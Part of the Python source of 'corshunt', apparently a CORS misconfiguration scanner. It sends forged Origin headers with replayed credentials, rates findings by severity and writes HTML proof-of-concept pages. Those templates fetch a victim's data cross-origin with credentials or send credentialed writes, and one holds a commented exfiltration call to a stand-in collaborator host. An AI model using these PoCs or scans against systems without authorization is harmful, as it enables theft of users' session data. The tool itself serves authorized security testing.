    def _send(self, conn: Conn, t: Target, extra: list[tuple[str, str]]) -> Response:
        base = [("Host", t.hostport), ("User-Agent", UA), ("Accept", "*/*"),
                ("Accept-Encoding", "identity"), ("Connection", "keep-alive")]
        headers = merge_headers(base, t.base_headers, extra)
        self.gate.wait()
        resp = conn.request(headers)
        self.stats.bump(requests=1)
        if not resp.ok:
            self.stats.bump(errors=1)
        if self.a.verbosity >= 2:
            self._dump(t, headers, resp)
        return resp, headers

    def _dump(self, t: Target, headers, resp: Response):
        p, c = self.pal.p, self.pal
        lines = [p(f"[debug] --> {t.method} {t.path} HTTP/1.1", "dim", "magenta")]
        for k, v in headers:
            lines.append(p(f"[debug]     {k}: {v}", "dim"))
        if t.body:
            lines.append(p(f"[debug]     {t.body.decode('utf-8', 'replace')}", "dim"))
        if resp.ok:
            lines.append(p(f"[debug] <-- {resp.status} {resp.reason}  "
                           f"{resp.body_len} B  {resp.elapsed*1000:.0f} ms", "dim", "magenta"))
            for k, v in resp.headers:
                if k.lower().startswith("access-control") or k.lower() in ("vary", "set-cookie", "content-type"):
                    lines.append(p(f"[debug]     {k}: {v}", "dim"))
        else:
            lines.append(p(f"[debug] <-- error: {resp.error}", "dim", "red"))
        self.pr.out("\n".join(lines))

    # -- one target ------------------------------------------------------- #

    def scan(self, t: Target):
        if self.stop.is_set():
            return
        try:
            self._scan(t)
        except Exception as exc:                      # never let one target kill the run
            self.pr.err(self.pal.p(f"[error] {t.url}: {type(exc).__name__}: {exc}", "red"))
            self.stats.bump(errors=1)
        finally:
            self.stats.bump(tested=1)

    def _scan(self, t: Target):
        pal, p = self.pal, self.pal.p
        auth_headers = self.auth.for_target(t)
        cli_headers = self.a.header_pairs
        effective = merge_headers(auth_headers, cli_headers)
        mech = auth_mechanism(merge_headers(t.base_headers, effective))

        conn = Conn(t, self.a.proxy, self.a.timeout)
        try:
            # baseline with credentials, no Origin
            base_resp, sent = self._send(conn, t, effective)
            if not base_resp.ok:
                if self.a.verbosity >= 1:
                    self.pr.out(p(f"[skip ] {t.url}  unreachable: {base_resp.error}", "grey"))
                return
            authed_fp = hashlib.sha1(base_resp.body).hexdigest()
            token_like, pii_like = body_signals(base_resp.body)
            samesite = observed_samesite(base_resp)

            # unauthenticated baseline, to tell apart user data from public data
            authed_differs = False
            if mech != "none":
                plain = [h for h in effective
                         if h[0].lower() not in ("cookie", "authorization", "x-api-key",
                                                 "api-key", "x-auth-token",
                                                 "x-access-token", "x-session-token")]
                anon_resp, _ = self._send(conn, t, plain)
                if anon_resp.ok:
                    authed_differs = hashlib.sha1(anon_resp.body).hexdigest() != authed_fp
                    if samesite is None:
                        samesite = observed_samesite(anon_resp)

            ctx = dict(auth_mech=mech, samesite=samesite, authed_differs=authed_differs,
                       token_like=token_like, pii_like=pii_like, sent_headers=sent)

            if self.a.verbosity >= 1:
                acao = base_resp.get("access-control-allow-origin") or "-"
                self.pr.out(p(f"[base ] {t.url}  {base_resp.status}  "
                              f"{base_resp.body_len} B  acao={acao}  auth={mech}"
                              f"  samesite={samesite or '-'}"
                              f"  authed-differs={'yes' if authed_differs else 'no'}",
                              "dim", "blue"))

            sendable, skipped = gen_payloads(t, self.a.attacker, self.a.force_ssl,
                                             self.enabled)
            if self.a.verbosity >= 2:
                for cls, origin, why in skipped:
                    self.pr.out(p(f"[filt ] {t.url}  cls={cls}  origin={origin}  ({why})", "dim"))

            reflect_origin = None
            found: dict[tuple, Finding] = {}
            blanket = False
            for idx, (cls, origin, _) in enumerate(sendable):
                if self.stop.is_set():
                    return
                if blanket and not self.a.no_shortcut:
                    rest = [c for c, _, _ in sendable[idx:]]
                    for f in found.values():
                        f["notes"].append(
                            "blanket reflection already proven, so these classes were "
                            f"not sent: {', '.join(rest)} (--no-shortcut to send them)")
                    break
                ctx_run = dict(ctx)
                resp, sent_h = self._send(conn, t, merge_headers(effective, [("Origin", origin)]))
                ctx_run["sent_headers"] = sent_h
                if not resp.ok:
                    if self.a.verbosity >= 1:
                        self.pr.out(p(f"[test ] {t.url}  cls={cls:8s} error: {resp.error}", "grey"))
                    continue
                if cls == "reflect":
                    reflect_origin = origin
                if self.a.verbosity >= 1:
                    acao = resp.get("access-control-allow-origin")
                    acac = resp.get("access-control-allow-credentials")
                    self.pr.out(p(f"[test ] {t.url}  cls={cls:8s} origin={origin}"
                                  f"  -> {resp.status}  acao={acao or '-'}"
                                  f"  acac={acac or '-'}", "dim"))
                f = assess(t, cls, origin, resp, ctx_run)
                if f:
                    if cls == "reflect":
                        blanket = True       # arbitrary origin accepted: the rest follows
                    self._fold(found, f)

            # preflight write check, one extra request per target
            if "preflight" in self.enabled and reflect_origin and not self.stop.is_set():
                pre = Target(t.url, t.scheme, t.host, t.port, t.path, method="OPTIONS",
                             body=None, base_headers=t.base_headers)
                pconn = Conn(pre, self.a.proxy, self.a.timeout)
                try:
                    resp, sent_h = self._send(
                        pconn, pre,
                        merge_headers(effective, [
                            ("Origin", reflect_origin),
                            ("Access-Control-Request-Method", "PUT"),
                            ("Access-Control-Request-Headers",
                             "authorization,content-type,x-requested-with"),
                        ]))
                    if resp.ok:
                        if self.a.verbosity >= 1:
                            self.pr.out(p(f"[pre  ] {t.url}  -> {resp.status}"
                                          f"  acam={resp.get('access-control-allow-methods') or '-'}"
                                          f"  acao={resp.get('access-control-allow-origin') or '-'}",
                                          "dim"))
                        ctx_pre = dict(ctx)
                        ctx_pre["sent_headers"] = sent_h
                        f = assess_preflight(pre, reflect_origin, resp, ctx_pre)
                        if f:
                            self._fold(found, f)
                finally:
                    pconn.close()

            for f in found.values():
                self._record(f)
        finally:
            conn.close()

    # -- findings --------------------------------------------------------- #

    @staticmethod
    def _fold(found: dict, f: Finding):
        """One misconfiguration reported once.

        Several payload classes hitting the same permissive rule (blanket
        reflection accepts reflect, null, append, prepend, sub...) is one bug,
        not five. Keep the first one, the worst severity, and list the rest.
        """
        key = (f["kind"], "wildcard" if f["acao"].strip() == "*" else "origin", f["acac"])
        prev = found.get(key)
        if prev is None:
            found[key] = f
            return
        also = prev.setdefault("also_accepted", [])
        if f["cls"] != prev["cls"] and f["cls"] not in also:
            also.append(f["cls"])
        if SEV_RANK[f["severity"]] > SEV_RANK[prev["severity"]]:
            # the harsher verdict wins, and brings its own reasoning with it
            for field in ("severity", "cls", "origin_sent", "requires", "notes",
                          "confidence", "acao"):
                prev[field] = f[field]

    def _record(self, f: Finding):
        if SEV_RANK[f["severity"]] < SEV_RANK[self.a.min_severity]:
            return
        with self.flock:
            self.findings.append(f)
        self.stats.finding(f["severity"])
        if self.a.poc_dir:
            f["poc"] = write_poc(self.a.poc_dir, f)
        self.pr.out(render_finding(f, self.pal))


# --------------------------------------------------------------------------- #
# rendering
# --------------------------------------------------------------------------- #

SEV_EXPLAIN = {
    "cors-read": {
        HIGH: "credentialed read of token-bearing, user-specific data from an "
              "attacker-controlled origin",
        MEDIUM: "credentialed read of user-specific data from an attacker-controlled "
                "origin",
        LOW: "credentialed access that needs a prerequisite, or whose impact is unproven",
        INFO: "permissive configuration with no exploitation path on its own",
    },
    "cors-write": {
        HIGH: "credentialed cross-origin write from an attacker-controlled origin",
        MEDIUM: "credentialed cross-origin write from an attacker-controlled origin",
        LOW: "cross-origin write approved, but the session reaching it is unproven",
        INFO: "permissive preflight with no exploitation path on its own",
    },
    "cors-wildcard": {
        HIGH: "", MEDIUM: "",
        LOW: "wildcard origin with an unusual side effect",
        INFO: "wildcard origin: no credentials possible, so nothing to exploit",
    },
}


def explain(kind: str, sev: str) -> str:
    return SEV_EXPLAIN.get(kind, SEV_EXPLAIN["cors-read"]).get(sev) \
        or SEV_EXPLAIN["cors-read"][sev]


def render_finding(f: Finding, pal: Palette) -> str:
    p = pal.p
    sev = f["severity"]
    badge = p(f"[{sev}]", *SEV_STYLE[sev])
    pad = " " * 9
    lines = [
        f"{badge} {p(f['kind'], 'bold', 'white')}  {p(f['cls'], 'bmagenta')}  "
        f"{p(f['url'], 'under', 'bblue')}",
        f"{pad}{p('origin sent', 'cyan')} : {p(f['origin_sent'], 'white')}",
        f"{pad}{p('acao', 'cyan')}        : {f['acao']}"
        + ("  (exact reflection)" if f['acao'].strip() != '*' else ""),
        f"{pad}{p('acac', 'cyan')}        : "
        + (p('true', 'bred') if f['acac'] else p('absent', 'grey')),
    ]
    if f.get("acam"):
        lines.append(f"{pad}{p('methods', 'cyan')}     : {f['acam']}")
    detail = f"{f['status']}  {f['content_type'].split(';')[0] or '-'}  {f['length']} B"
    flags = []
    if f["authed_differs"]:
        flags.append("differs from unauth")
    if f["token_like"]:
        flags.append(p("token-like material", "bred"))
    if f["pii_like"]:
        flags.append("pii-like keys")
    if f["samesite"]:
        flags.append(f"samesite={f['samesite']}")
    flags.append(f"auth={f['auth_mech']}")
    lines.append(f"{pad}{p('response', 'cyan')}    : {detail}   ({', '.join(flags)})")
    if f.get("also_accepted"):
        lines.append(f"{pad}{p('also', 'cyan')}        : same outcome for "
                     f"{p(', '.join(f['also_accepted']), 'bmagenta')}"
                     " - one misconfiguration, not several")
    for r in f["requires"]:
        lines.append(f"{pad}{p('requires', 'yellow')}    : {r}")
    for n in f["notes"]:
        lines.append(f"{pad}{p('note', 'grey')}        : {p(n, 'grey')}")
    lines.append(f"{pad}{p('severity', 'cyan')}    : "
                 f"{p(sev, *SEV_STYLE[sev])} - {explain(f['kind'], sev)}")
    if f.get("poc"):
        lines.append(f"{pad}{p('poc', 'cyan')}         : {f['poc']}")
    return "\n".join(lines) + "\n"


POC_TEMPLATE = """<!doctype html>
<meta charset="utf-8">
<title>corshunt PoC - {cls}</title>
<h3>corshunt PoC</h3>
<pre>target : {url}
origin : {origin}
class  : {cls}</pre>
<p>Open this page from <b>{origin_host}</b> while logged in to the target, then look at
the box below and at your DevTools network tab.</p>
<pre id="out">running...</pre>
{body}
"""

POC_FETCH = """<script>
fetch({url!r}, {{credentials: 'include'}})
  .then(r => r.text())
  .then(d => {{
    document.getElementById('out').textContent = d.slice(0, 2000);
    // exfiltration leg - point this at your own collaborator host
    // fetch('https://COLLAB.example/?d=' + encodeURIComponent(btoa(d)));
  }})
  .catch(e => document.getElementById('out').textContent = 'blocked: ' + e);
</script>"""

POC_NULL = """<iframe sandbox="allow-scripts" srcdoc="{inner}"></iframe>
<script>
window.addEventListener('message', e => {{
  document.getElementById('out').textContent = String(e.data).slice(0, 2000);
}});
</script>"""

POC_NULL_INNER = """<script>
fetch({url!r}, {{credentials:'include'}})
  .then(r => r.text())
  .then(d => parent.postMessage(d, '*'))
  .catch(e => parent.postMessage('blocked: ' + e, '*'));
</script>"""

POC_WRITE = """<script>
fetch({url!r}, {{
  method: 'PUT',
  credentials: 'include',
  headers: {{'Content-Type': 'application/json'}},
  body: JSON.stringify({{corshunt: 'write-probe'}})
}})
  .then(r => document.getElementById('out').textContent =
        'preflight passed, request sent: HTTP ' + r.status)
  .catch(e => document.getElementById('out').textContent = 'blocked: ' + e);
</script>"""


def write_poc(directory: str, f: Finding) -> str:
    os.makedirs(directory, exist_ok=True)
    u = urlsplit(f["url"])
    slug = re.sub(r"[^A-Za-z0-9._-]+", "_",
                  f"{u.hostname}{u.path}") .strip("_")[:80]
    name = f"{slug}__{f['cls']}__{f['severity'].lower()}.html"
    path = os.path.join(directory, name)

    if f["kind"] == "cors-write":
        body = POC_WRITE.format(url=f["url"])
    elif f["cls"] == "null":
        inner = html.escape(POC_NULL_INNER.format(url=f["url"]), quote=True)
        body = POC_NULL.format(inner=inner)
    else:
        body = POC_FETCH.format(url=f["url"])

    origin = f["origin_sent"]
    origin_host = "a sandboxed iframe (Origin: null)" if origin == "null" else origin
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(POC_TEMPLATE.format(cls=f["cls"], url=f["url"], origin=origin,
                                     origin_host=origin_host, body=body))
    return path


def banner(pal: Palette, args, total: int, enabled: set[str]) -> str:
    p = pal.p
    head = p(f"  {TOOL} {VERSION}", "bold", "bmagenta") + p("  CORS misconfiguration hunter", "grey")
    bits = [
        f"{p('targets', 'cyan')}  {total}",
        f"{p('payloads', 'cyan')} {','.join(sorted(enabled))}",
        f"{p('psl', 'cyan')}      " + ("tldextract, bundled snapshot, offline"
                                       if _tldextract is not None else
                                       "built-in heuristic - pip install tldextract "
                                       "for the Public Suffix List"),
        f"{p('threads', 'cyan')}  {args.threads}",
        f"{p('delay', 'cyan')}    {args.delay}s",
        f"{p('auth', 'cyan')}     " + ("--auth-dir " + args.auth_dir if args.auth_dir
                                       else "--auth-file " + args.auth_file if args.auth_file
                                       else "-H only" if args.header_pairs
                                       else "replayed from " + args.raw if args.raw
                                       else "none"),
    ]
    return head + "\n" + "\n".join("  " + b for b in bits) + "\n"


def summary(pal: Palette, s: dict) -> str:
    p = pal.p
    rate = s["requests"] / s["elapsed"] if s["elapsed"] > 0 else 0
    by = s["by_sev"]
    counts = "  ".join(
        p(f"{k.lower()} {by[k]}", *SEV_STYLE[k]) for k in (HIGH, MEDIUM, LOW, INFO))
    return "\n".join([
        p("  summary " + "-" * 56, "grey"),
        f"  {p('targets tested', 'cyan')}   {s['tested']}/{s['total']}",
        f"  {p('requests sent', 'cyan')}    {s['requests']}  ({rate:.1f}/s)",
        f"  {p('request errors', 'cyan')}   {s['errors']}",
        f"  {p('findings', 'cyan')}         {s['findings']}   {counts}",
        f"  {p('elapsed', 'cyan')}          {hms(s['elapsed'])}",
        "",
    ])


# --------------------------------------------------------------------------- #
# status thread
# --------------------------------------------------------------------------- #


def status_loop(stats: Stats, pr: Printer, pal: Palette, interval: float,
                stop: threading.Event):
    while not stop.wait(interval):
        s = stats.snapshot()
        remaining = s["total"] - s["tested"]
        rate = s["tested"] / s["elapsed"] if s["elapsed"] > 0 else 0
        eta = hms(remaining / rate) if rate > 0 and remaining else "--:--"
        pr.out(pal.p(
            f"[status {hms(s['elapsed'])}]  tested {s['tested']}/{s['total']}"
            f"  remaining {remaining}  findings {s['findings']}"
            f"  req {s['requests']}  {rate:.1f} u/s  eta {eta}", "dim", "bblue"))


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=TOOL,
        description=f"{TOOL} {VERSION} - hunt CORS misconfigurations and rate them honestly",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="severity: INFO permissive but not exploitable  |  LOW needs a "
               "prerequisite or impact unproven  |  MEDIUM credentialed read of user "
               "data  |  HIGH credentialed read of token-bearing data. "
               f"{TOOL} never emits CRITICAL: that needs a demonstrated takeover.",
    )
    p.add_argument("-v", dest="verbosity", nargs="?", type=int, choices=[0, 1, 2],
                   const=1, default=0,
                   help="verbosity: 0 = only successes (default), 1 = every test "
                        "performed, 2 = debug (full request and the exact payload "
                        "sent, response status/size, and payloads skipped as filtered)")

    src = p.add_argument_group("targets")
    src.add_argument("-u", dest="url", metavar="URL", help="single URL to test")
    src.add_argument("-l", dest="list", metavar="LIST",
                     help="file containing a list of URLs to test")
    src.add_argument("-r", dest="raw", metavar="FILE",
                     help="raw HTTP request file (Burp/ZAP export): method, headers "
                          "(Cookie...) and body are replayed, and the Origin payloads "
                          "follow the enabled classes (see --no-*)")
    src.add_argument("--force-ssl", action="store_true",
                     help="force https for a -r request (default: http, deduced from "
                          "Origin/Referer). Also forces the scheme of the attacker "
                          "origins (-b) to https whatever the target is")

    net = p.add_argument_group("network")
    net.add_argument("-t", "--threads", type=int, default=5,
                     help="concurrent URLs to scan (default 5)")
    net.add_argument("--timeout", type=float, default=10.0, help="request timeout (s)")
    net.add_argument("-d", "--delay", type=float, default=0.0,
                     help="minimum gap between requests (s), enforced globally across "
                          "all threads")
    net.add_argument("-H", "--header", action="append", default=[], metavar="HEADER",
                     help="extra header 'Name: value' (repeatable) - also how to set a "
                          "Cookie or override the User-Agent")
    net.add_argument("-x", "--proxy", metavar="PROXY",
                     help="proxy URL, e.g. http://127.0.0.1:8080")

    au = p.add_argument_group("authentication")
    g = au.add_mutually_exclusive_group()
    g.add_argument("--auth-file", metavar="FILE",
                   help="headers to authenticate with, -H syntax, one per line, '#' "
                        "for comments. Applied to EVERY target whatever the file is "
                        "called")
    g.add_argument("--auth-dir", metavar="DIR",
                   help="directory of auth files named after the host they "
                        "authenticate: www.example.com.txt covers every port of that "
                        "host, www.example.com_8080.txt covers that port only and wins "
                        "over it. No subdomain inheritance. Only the host a file names "
                        "receives its headers, which is what -H cannot do in -l mode. "
                        "Mutually exclusive with --auth-file")

    pay = p.add_argument_group("payloads")
    pay.add_argument("-b", "--attacker-domain", dest="attacker", default="evil.tld",
                     metavar="DOMAIN",
                     help="attacker-controlled domain used to build the Origin "
                          "payloads (default evil.tld). Use a domain you own so a "
                          "finding is directly exploitable and a WAF has nothing "
                          "blacklisted to match on")
    pay.add_argument("--deep", action="store_true",
                     help="also send the long-tail payload classes (dot, port, case, "
                          "special) - more requests, mostly INFO results")
    for cls in list(PAYLOADS) + ["preflight"]:
        pay.add_argument(f"--no-{cls}", dest=f"no_{cls}", action="store_true",
                         help=argparse.SUPPRESS)
    pay.add_argument("--no-shortcut", action="store_true",
                     help="once blanket reflection is proven on a target, the "
                          "structural classes are implied and are not sent. This "
                          "sends them anyway")
    pay.add_argument("--list-payloads", action="store_true",
                     help="print the payload classes and exit")

    out = p.add_argument_group("output")
    out.add_argument("-o", "--output", metavar="OUTPUT",
                     help="write TEXT report to this file (identical to standard output)")
    out.add_argument("--json", "--output-json", dest="output_json", metavar="OUTPUT",
                     help="write JSON report to this file (only findings)")
    out.add_argument("--poc-dir", metavar="DIR",
                     help="write a standalone HTML proof of concept per finding into "
                          "this directory")
    out.add_argument("--min-severity", choices=["info", "low", "medium", "high"],
                     default="info", help="do not report below this severity "
                                          "(default info: report everything)")
    out.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                     help="seconds between status lines in -l mode (default 30)")
    out.add_argument("--dedupe", choices=["none", "host"], default="none",
                     help="in -l mode, 'host' keeps one URL per host:port - CORS "
                          "policy is usually per host, and this is the single biggest "
                          "saving on large recon lists (default none)")
    out.add_argument("--no-color", action="store_true", help="disable ANSI colors")
    p.add_argument("--version", action="version", version=f"{TOOL} {VERSION}")
    return p


def print_payload_table(pal: Palette):
    p = pal.p
    print(p(f"  {TOOL} payload classes", "bold", "bmagenta"))
    print(p(f"  {'class':10s} {'default':8s} {'control':8s} description", "grey"))
    for name, spec in PAYLOADS.items():
        ctrl = {"yes": p("yes", "bred"), "chain": p("chain", "byellow"),
                "no": p("no", "grey")}[spec["control"]]
        dflt = p("on", "bgreen") if spec["default"] else p("--deep", "grey")
        print(f"  {p(name, 'bmagenta'):10s} {dflt:8s} {ctrl:8s} {spec['desc']}")
        if spec["requires"]:
            print(p(f"  {'':10s} {'':8s} {'':8s} requires: {spec['requires']}", "grey"))
    print(f"  {p('preflight', 'bmagenta'):10s} {p('on', 'bgreen'):8s} "
          f"{p('yes', 'bred'):8s} OPTIONS probe for credentialed cross-origin writes")
    print(p("\n  control = is the permitted origin one an attacker can actually serve "
            "from?\n", "grey"))


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    use_color = (not args.no_color and os.environ.get("NO_COLOR") is None
                 and sys.stdout.isatty())
    if not args.no_color and not sys.stdout.isatty() and os.environ.get("FORCE_COLOR"):
        use_color = True
    pal = Palette(use_color)

    if args.list_payloads:
        print_payload_table(pal)
        return 0

    if not (args.url or args.list or args.raw):
        print(f"{TOOL}: one of -u, -l or -r is required (see -h)", file=sys.stderr)
        return 2

    args.min_severity = args.min_severity.upper()
    args.header_pairs = [h for h in (parse_header_arg(x) for x in args.header) if h]


    enabled = {c for c, s in PAYLOADS.items() if s["default"] or args.deep}
    enabled.add("preflight")
    for cls in list(PAYLOADS) + ["preflight"]:
        if getattr(args, f"no_{cls}", False):
            enabled.discard(cls)

    # ---- targets ---- #
    targets: list[Target] = []
    if args.raw:
        try:
            targets.append(parse_raw_request(args.raw, args.force_ssl))
        except Exception as exc:
            print(f"{TOOL}: cannot parse {args.raw}: {exc}", file=sys.stderr)
            return 2
    if args.url:
        t = parse_url(args.url)
        if not t:
            print(f"{TOOL}: cannot parse URL {args.url!r}", file=sys.stderr)
            return 2
        targets.append(t)
    if args.list:
        try:
            with open(args.list, "r", encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    t = parse_url(line)
                    if t:
                        targets.append(t)
        except OSError as exc:
            print(f"{TOOL}: {exc}", file=sys.stderr)
            return 2

    if args.dedupe == "host":
        seen, deduped = set(), []
        for t in targets:
            key = (t.scheme, t.host, t.port)
            if key not in seen:
                seen.add(key)
                deduped.append(t)
        targets = deduped

    if not targets:
        print(f"{TOOL}: no usable target", file=sys.stderr)
        return 2

    pr = Printer(pal, args.output)
    stats = Stats(len(targets))
    stop = threading.Event()
    auth = AuthStore(args.auth_file, args.auth_dir)
    scanner = Scanner(args, pal, pr, stats, auth, enabled, stop)

    pr.out(banner(pal, args, len(targets), enabled))

    status_thread = None
    if args.list and args.status_interval > 0:
        status_thread = threading.Thread(
            target=status_loop,
            args=(stats, pr, pal, args.status_interval, stop), daemon=True)
        status_thread.start()

    interrupted = False
    ex = concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.threads))
    try:
        futures = [ex.submit(scanner.scan, t) for t in targets]
        for _ in concurrent.futures.as_completed(futures):
            pass
        ex.shutdown(wait=True)
    except KeyboardInterrupt:
        interrupted = True
        stop.set()
        pr.err(pal.p("\n[abort] interrupted - dropping queued targets and writing "
                     "what we have", "byellow"))
        # drop everything not started yet; in-flight requests finish on their timeout
        ex.shutdown(wait=False, cancel_futures=True)
    finally:
        stop.set()
        if status_thread:
            status_thread.join(timeout=1.0)

    snap = stats.snapshot()
    pr.out("")
    pr.out(summary(pal, snap))

    if args.output_json:
        report = {
            "tool": TOOL, "version": VERSION,
            "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
            "interrupted": interrupted,
            "options": {
                "attacker_domain": args.attacker, "payloads": sorted(enabled),
                "threads": args.threads, "delay": args.delay,
                "deep": args.deep, "dedupe": args.dedupe,
                "min_severity": args.min_severity,
            },
            "stats": {k: v for k, v in snap.items() if k != "elapsed"} | {
                "elapsed_seconds": round(snap["elapsed"], 2)},
            "findings": scanner.findings,
        }
        try:
            with open(args.output_json, "w", encoding="utf-8") as fh:
                json.dump(report, fh, indent=2, ensure_ascii=False)
            pr.out(pal.p(f"  json report  {args.output_json}", "grey"))
        except OSError as exc:
            pr.err(pal.p(f"[error] cannot write {args.output_json}: {exc}", "red"))

    pr.close()
    if interrupted:
        return 130
    return 1 if any(snap["by_sev"][s] for s in (HIGH, MEDIUM, LOW)) else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
